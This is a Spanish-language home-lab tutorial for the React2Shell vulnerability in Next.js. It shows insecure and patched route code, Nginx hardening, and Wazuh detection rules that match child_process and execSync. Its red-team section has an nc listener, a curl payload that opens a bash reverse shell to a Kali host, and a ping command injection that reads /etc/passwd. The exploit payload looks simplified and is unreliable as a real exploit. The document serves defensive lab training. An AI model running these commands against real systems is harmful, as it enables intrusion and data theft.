3. Análisis de Vulnerabilidades Críticas de GenAI (React2Shell)

Explotación del protocolo Flight de React Server Components e implicaciones de código

El vector de ataque más destacado del laboratorio es el exploit React2Shell (CVE-2025-55182 / CVE-2025-66478), el cual compromete de raíz la arquitectura de React Server Components (RSC) en Next.js. La vulnerabilidad surge por la ausencia de comprobación de propiedades internas mediante hasOwnProperty() dentro del deserializador del protocolo Flight, permitiendo a los atacantes invocar referencias cruzadas e inyectar *gadgets* mediante Prototype Pollution.

Código Inseguro Next.js (Autogenerado por IA)

Los asistentes de código por IA suelen generar lógica de comunicación asumiendo incorrectamente que los datos serializados en el protocolo Flight son de plena confianza. 

// ❌ Exposición directa del deserializador RSC
import { deserializeRSC } from 'react-server-dom-webpack'; // [11]

export async function POST(req) {
  const payload = await req.text();
  // El deserializador procesa sin autenticación ni firma criptográfica [12]
  const data = await deserializeRSC(payload); 
  return Response.json({ success: true, data });
}

Implementación Remediada (DevSecOps)

El código remediado exige la actualización estructural de las dependencias Next.js a versiones estables (p.ej. 15.5.7+) y el uso de firmas criptográficas para payloads. 

// ✅ Remediación y mitigación estructural
// 1. Actualización de package.json de v15.5.6 a v15.5.7
// 2. Validación y saneamiento estricto de entradas [13]
export async function POST(req) {
  const userAgent = req.headers.get("user-agent");
  // Firma y verificación de integridad obligatoria de payloads RSC
  if (!verifyRSCSignature(req)) {
    return new Response("Unauthorized Signature", { status: 401 });
  }
  const payload = await req.text();
  const data = await secureRSCParser(payload);
  return Response.json({ success: true, data });
}

4. Hardening de Nginx & Let's Encrypt (DNS-01)

Configuración perimetral de aislamiento por IP y generación silenciosa de certificados

El Proxy de Nginx en la Raspberry Pi 5 es la única puerta de entrada desde la red WAN. Para proteger la red doméstica de accesos no autorizados de botnets, se configuran directivas allow/deny para enrutar exclusivamente el tráfico de tu IP de Kali. Adicionalmente, el certificado SSL se expide mediante el desafío DNS-01, interactuando con la API de DuckDNS mediante registros TXT sin necesidad de abrir el puerto HTTP (80) al mundo entero.

/etc/nginx/nginx.conf NGINX CONFIG 
events { worker_connections 1024; }

http {
    log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';
    access_log /var/log/nginx/access.log main;
    error_log /var/log/nginx/error.log warn;

    # Hardening global SSL/TLS
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';

    # Cabeceras defensivas para bloqueo de secuestro de clic y XSS 
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';" always;

    # --- ENRUTAMIENTO POR DOMINIO 1: NEXT.JS APP ---
    server {
        listen 443 ssl http2;
        server_name webinsegura1.duckdns.org;

        ssl_certificate /etc/letsencrypt/live/webinsegura1.duckdns.org/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/webinsegura1.duckdns.org/privkey.pem;

        # ⚠️ HARDENING CRÍTICO: SOLO TU IP DE ATACANTE KALI LINUX TIENE ACCESO
        allow 85.60.22.144;  # Reemplazar con la IP de tu Kali
        deny all;

        location / {
            proxy_pass http://172.20.0.20:9000;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded-for;
        }
    }

    # --- ENRUTAMIENTO POR DOMINIO 2: DVWA CLASSIC APP ---
    server {
        listen 443 ssl http2;
        server_name webinsegura2.duckdns.org;

        ssl_certificate /etc/letsencrypt/live/webinsegura2.duckdns.org/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/webinsegura2.duckdns.org/privkey.pem;

        allow 85.60.22.144;  # Reemplazar con la IP de tu Kali
        deny all;

        location / {
            proxy_pass http://172.20.0.30:80;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded-for;
        }
    }
}

5. Ingesta SIEM & Reglas XML Personalizadas

Configuración del agente de Wazuh en ARM64 y decodificación nativa de logs JSON

El agente de Wazuh instalado en la Raspberry Pi 5 lee en tiempo real el log de auditoría JSON generado por la aplicación Next.js. El decodificador JSON nativo de Wazuh procesa los campos de forma dinámica sin consumir hilos de procesamiento. El motor de alertas en el host centralizado de Ubuntu Server ejecuta la regla personalizada XML de nivel crítico para alertar en la interfaz ante inyecciones o detonaciones del exploit React2Shell.[18, 1]

Ingesta Local (`/var/ossec/etc/ossec.conf`) 

<localfile>
  <log_format>json</log_format>
  <location>/var/log/app/security.json</location>
  <label key="app.name">modern_node_app</label>
</localfile>

<localfile>
  <log_format>apache</log_format>
  <location>/var/log/nginx/access.log</location>
</localfile>

Reglas del SIEM (`local_rules.xml`) 

<group name="web,lab_modern_app,">

  <rule id="100500" level="0">
    <decoded_as>json</decoded_as>
    <field name="source">app_server</field>
    <description>Evento de telemetría de Next.js.</description>
  </rule>

  <rule id="100503" level="14">
    <if_sid>100500</if_sid>
    <field name="input_received">.*node:child_process.*|.*execSync.*|.*Flight-Protocol.*</field>
    <description>Crítico: Explotación React2Shell detectada (CVE-2025-55182).</description>
    <mitre>
      <id>T1210</id>
    </mitre>
  </rule>

</group>

6. Guía de Ejecución de Pruebas Ofensivas (Red Team)

Procedimientos paso a paso para la explotación de los vectores distribuidos

Ejecuta de manera metodológica las pruebas desde tu Kali Linux de auditoría externa. Cada ataque ha sido diseñado para generar un log específico JSON o de acceso apache que será correlacionado por Wazuh en tiempo real.

PRUEBA A Reconocimiento del Sistema Objetivo

Ejecuta un escaneo perimetral para validar la resolución DNS de DuckDNS y confirmar las cabeceras HTTPS de Nginx: 

nmap -sV -sC -p 443 webinsegura1.duckdns.org

PRUEBA B Detonación de RCE React2Shell (CVE-2025-55182)

Prepara un listener con nc -lvnp 4444 en tu Kali externa con dirección IP pública. Luego, ejecuta la inyección directa contra el protocolo Flight de Next.js para forzar la inyección del shell interactiva: 

curl -X POST -H "Content-Type: text/x-component" --data-binary $'1:I\n2:O{"command": "bash -c \'bash -i >& /dev/tcp/IP_PUBLICA_KALI/4444 0>&1\'"}
' https://webinsegura1.duckdns.org/api/rsc -k

PRUEBA C Inyección de Comandos en Consola

Exploit para comprometer el endpoint de ping autogenerado por IA, inyectando un delimitador de consola para volcar ficheros sensibles [1, 19]: 

curl -X POST -H "Content-Type: application/json" -d '{"host": "8.8.8.8; cat /etc/passwd"}' https://webinsegura1.duckdns.org/api/diagnostics -k
